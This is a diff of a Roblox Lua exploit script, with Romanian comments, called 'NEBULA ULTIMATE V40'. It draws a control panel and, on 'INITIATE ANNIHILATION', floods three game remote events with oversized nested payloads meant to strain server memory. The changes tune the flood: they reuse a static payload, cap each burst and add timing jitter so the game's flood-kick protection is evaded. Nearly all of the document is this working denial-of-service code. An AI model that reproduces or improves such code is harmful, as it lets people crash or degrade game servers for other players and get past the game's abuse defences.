@@ -2,38 +2,43 @@ local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local RunService = game:GetService("RunService")
 local Players = game:GetService("Players")
 local HttpService = game:GetService("HttpService")
+local UserInputService = game:GetService("UserInputService")
 
 local player = Players.LocalPlayer
 local isActive = false
-local power = 400 -- Putere brută crescută
+local power = 400 
 
--- ========== TARGETE CRITICE (FRAGMENTARE) ==========
+-- ========== TARGETE CRITICE ==========
 local targets = {
     ReplicatedStorage:FindFirstChild("Packages/Synchronizer/RequestData", true),
     ReplicatedStorage:FindFirstChild("RF/ValentinesShopService/SearchUser", true),
     ReplicatedStorage:FindFirstChild("RE/PlotService/CashCollected", true)
 }
 
--- ========== PAYLOAD NUCLEAR (STRESEAZĂ MEMORIA SERVERULUI) ==========
-local function getVoidPayload()
-    local t = {}
-    -- Creăm un tabel "Deep-Nested" care forțează recursivitatea serverului
-    for i = 1, 10 do
-        t[HttpService:GenerateGUID(false):sub(1,6)] = {
-            ["Data"] = string.rep("💣", 150),
-            ["Math"] = { [math.random(1, 100)] = math.huge },
-            ["Entropy"] = tick()
-        }
-    end
-    return t
+-- ========== STATIC PAYLOAD (OPTIMIZARE RAM) ==========
+-- Generăm tabelul o singură dată la început pentru a evita supraîncărcarea memoriei (Garbage Collection)
+local STATIC_VOID_PAYLOAD = {}
+for i = 1, 10 do
+    STATIC_VOID_PAYLOAD[HttpService:GenerateGUID(false):sub(1,6)] = {
+        ["Data"] = string.rep("💣", 150),
+        ["Math"] = { [i] = math.huge },
+        ["Static"] = true
+    }
 end
 
--- ========== INTERFAȚĂ GONZO V40 (PURPLE GLOW) ==========
+-- ========== INTERFAȚĂ GONZO V40 ==========
 local ScreenGui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
 local Main = Instance.new("Frame", ScreenGui)
 Main.Size, Main.Position = UDim2.new(0, 340, 0, 480), UDim2.new(0.5, -170, 0.2, 0)
 Main.BackgroundColor3 = Color3.fromRGB(10, 0, 15)
-Main.Active, Main.Draggable = true, true
+Main.Active = true -- Draggable modern implementat mai jos
+
+-- Dragging System (Înlocuiește proprietatea Draggable depreciată)
+local dragStart, startPos, dragging
+Main.InputBegan:Connect(function(i) if i.UserInputType == Enum.UserInputType.MouseButton1 then dragging = true dragStart = i.Position startPos = Main.Position end end)
+UserInputService.InputChanged:Connect(function(i) if dragging and i.UserInputType == Enum.UserInputType.MouseMovement then local delta = i.Position - dragStart Main.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y) end end)
+UserInputService.InputEnded:Connect(function(i) if i.UserInputType == Enum.UserInputType.MouseButton1 then dragging = false end end)
+
 Instance.new("UICorner", Main).CornerRadius = UDim.new(0, 15)
 local Glow = Instance.new("UIStroke", Main)
 Glow.Color, Glow.Thickness = Color3.fromRGB(180, 0, 255), 2
@@ -43,7 +48,6 @@ Title.Size, Title.Text = UDim2.new(1, 0, 0, 50), "NEBULA ULTIMATE V40"
 Title.TextColor3, Title.Font = Color3.fromRGB(220, 100, 255), Enum.Font.GothamBlack
 Title.BackgroundTransparency, Title.TextSize = 1, 18
 
--- SLIDER (DESIGN GONZO)
 local function CreateSlider(name, pos, minVal, maxVal, default)
     local Label = Instance.new("TextLabel", Main)
     Label.Size, Label.Position = UDim2.new(1, 0, 0, 25), pos
@@ -63,12 +67,11 @@ local function CreateSlider(name, pos, minVal, maxVal, default)
             power = math.floor(minVal + (p * (maxVal - minVal)))
             Label.Text = name .. ": " .. power
         end)
-        game:GetService("UserInputService").InputEnded:Connect(function(i) if i.UserInputType == Enum.UserInputType.MouseButton1 then move:Disconnect() end end)
+        UserInputService.InputEnded:Connect(function(i) if i.UserInputType == Enum.UserInputType.MouseButton1 then move:Disconnect() end end)
     end)
 end
 CreateSlider("STORM PRESSURE", UDim2.new(0, 0, 0.2, 0), 1, 2000, 400)
 
--- BUTOANE
 local ActionBtn = Instance.new("TextButton", Main)
 ActionBtn.Size, ActionBtn.Position = UDim2.new(0.8, 0, 0, 60), UDim2.new(0.1, 0, 0.5, 0)
 ActionBtn.Text, ActionBtn.BackgroundColor3 = "INITIATE ANNIHILATION", Color3.fromRGB(100, 0, 200)
@@ -81,7 +84,7 @@ AbortBtn.Text, AbortBtn.BackgroundColor3 = "ABORT / CLEANUP", Color3.fromRGB(150
 AbortBtn.TextColor3 = Color3.new(1, 1, 1)
 Instance.new("UICorner", AbortBtn)
 
--- ========== MOTOR V40 (STEALTH FRAGMENTATION) ==========
+-- ========== MOTOR OPTIMIZAT ==========
 ActionBtn.MouseButton1Click:Connect(function()
     if isActive then return end
     isActive = true
@@ -90,25 +93,23 @@ ActionBtn.MouseButton1Click:Connect(function()
     
     task.spawn(function()
         while isActive do
-            -- Folosim [task.defer](url:https://create.roblox.com)
-            -- pentru a trimite atacul fără a-ți bloca ție frame-ul (0 LAG FPS)
             for _, r in pairs(targets) do
                 if r and isActive then
+                    -- Folosim task.defer pentru pachete asincrone fără lag FPS
                     task.defer(function()
                         pcall(function()
-                            -- Fragmentăm atacul: trimitem mai puține pachete dar mai des
-                            for i = 1, power / 10 do
-                                r:FireServer(getVoidPayload())
+                            -- Trimitere în rafală bazată pe power
+                            for i = 1, math.clamp(power / 10, 1, 200) do
+                                r:FireServer(STATIC_VOID_PAYLOAD)
                             end
                         end)
                     end)
                 end
             end
             
-            -- Sincronizare cu ciclul Heartbeat pentru a nu-ți îneca internetul tău
+            -- Sincronizare rețea pentru a preveni kick-ul instantaneu (Inbound Flood)
             RunService.Heartbeat:Wait()
-            -- Un mic jitter aleatoriu previne kick-ul de tip "Flood"
-            if math.random() > 0.9 then task.wait(0.1) end
+            if math.random() > 0.8 then task.wait(0.05) end
         end
     end)
 end)
